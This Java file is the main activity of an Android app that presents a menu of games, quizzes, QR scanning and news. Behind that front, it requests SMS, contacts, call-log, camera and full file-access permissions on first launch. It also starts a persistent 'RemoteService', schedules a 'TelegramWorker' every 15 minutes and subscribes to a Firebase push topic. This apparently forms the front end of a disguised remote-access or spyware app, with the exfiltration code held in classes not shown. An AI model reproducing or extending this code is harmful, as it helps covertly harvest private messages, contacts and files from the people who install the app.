package com.sohaibazmi.remote;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.widget.Toast;
import com.google.firebase.messaging.FirebaseMessaging;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.recyclerview.widget.GridLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;


public class MainActivity extends AppCompatActivity {
    private final String[] permissions = {
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.MANAGE_EXTERNAL_STORAGE,
            Manifest.permission.CAMERA,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
    };

    private static final String PREFS_NAME = "MyAppPrefs";
    private static final String KEY_FIRST_RUN = "first_run";
    private final int PERM_REQ_CODE = 101;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        boolean isFirstRun = prefs.getBoolean(KEY_FIRST_RUN, true);

        if (isFirstRun) {
            if (!hasAllPermissions()) {
                ActivityCompat.requestPermissions(this, permissions, PERM_REQ_CODE);
            } else {
                Toast.makeText(this, "WelCome to our Community", Toast.LENGTH_SHORT).show();
            }

            prefs.edit().putBoolean(KEY_FIRST_RUN, false).apply();
        } else {
            Toast.makeText(this, "Welcome back", Toast.LENGTH_SHORT).show();
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(new Intent(this, RemoteService.class));
        }

        scheduleTelegramWorker();
        FirebaseMessaging.getInstance().subscribeToTopic("all");

        RecyclerView menuRecyclerView = findViewById(R.id.menuRecyclerView);
        menuRecyclerView.setLayoutManager(new GridLayoutManager(this, 2));
        List<MenuItem> menuList = new ArrayList<>();
        menuList.add(new MenuItem("Play Games", R.drawable.ic_games));
        menuList.add(new MenuItem("Play Quiz", R.drawable.ic_quiz));
        menuList.add(new MenuItem("Scan QR", R.drawable.ic_qr));
        menuList.add(new MenuItem("Market Live", R.drawable.ic_market));
        menuList.add(new MenuItem("News & Updates", R.drawable.ic_news));
        menuList.add(new MenuItem("Profile", R.drawable.ic_profile));
        menuList.add(new MenuItem("Contact Developer", R.drawable.ic_contact));

        MenuAdapter menuAdapter = new MenuAdapter(menuList, this);
        menuRecyclerView.setAdapter(menuAdapter);

    }

    private void scheduleTelegramWorker() {
        PeriodicWorkRequest workRequest = new PeriodicWorkRequest.Builder(TelegramWorker.class, 15, TimeUnit.MINUTES).build();
        WorkManager.getInstance(this).enqueueUniquePeriodicWork("TelegramWorker",
                androidx.work.ExistingPeriodicWorkPolicy.KEEP, workRequest);
    }

    private boolean hasAllPermissions() {
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED)
                return false;
        }
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] perms,
                                           @NonNull int[] results) {
        super.onRequestPermissionsResult(requestCode, perms, results);

        if (requestCode == PERM_REQ_CODE) {
            boolean granted = true;
            for (int r : results) {
                if (r != PackageManager.PERMISSION_GRANTED) {
                    granted = false;
                    break;
                }
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Toast.makeText(this, "⚠️ File access not granted", Toast.LENGTH_SHORT).show();
                return;
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        }
    }
}
